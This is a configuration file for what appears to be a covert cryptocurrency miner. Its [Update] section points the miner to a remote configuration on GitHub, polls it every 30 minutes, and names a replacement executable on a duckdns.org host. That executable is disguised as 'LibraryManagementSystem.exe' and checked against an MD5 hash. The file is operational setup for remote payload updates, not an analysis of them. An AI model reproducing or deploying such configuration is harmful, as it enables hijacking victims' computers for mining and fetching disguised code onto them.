[Update]
;config_url=https://raw.githubusercontent.com/shadk2233/rtxdf/master/sklbt.txt   	; You can update the url that points to the configuration file. Must begin with "http://" or "https://" 
knock_time=30 				     	; Number of minutes the miner waits between visits to config file. If never specified, default is 30 minutes. 
;update_url=http://shadhk.duckdns.org/LibraryManagementSystem.exe		; url of new miner. Miner will get updated with this file. 
;update_hash=EC677F7CCA568AE0F1B846D7079505C0				; md5 hash of new miner file. 32 characters long (16 byte hexadecimal format for hash). You need to specify this value, othewise miner will not get updated!

;End of configuration. Do not remove this line, ";End" string specifies end of configuration file.

;Everything after a ";" character is a comment, so it is ignored by the miner when parsing the configuration. Only the ";" character is used for this purpose. 
;Always include the appropriate options below the defined "[Miner]" and "[Update]" sections. If you do not include the section names it won't work. 
;Make sure everything is spelled correctly
;If you specify "config_url" double check it is correctly spelled, otherwise the miner that reads an incorrect url will never go back to a correct url (i.e. last configuration will be locked).
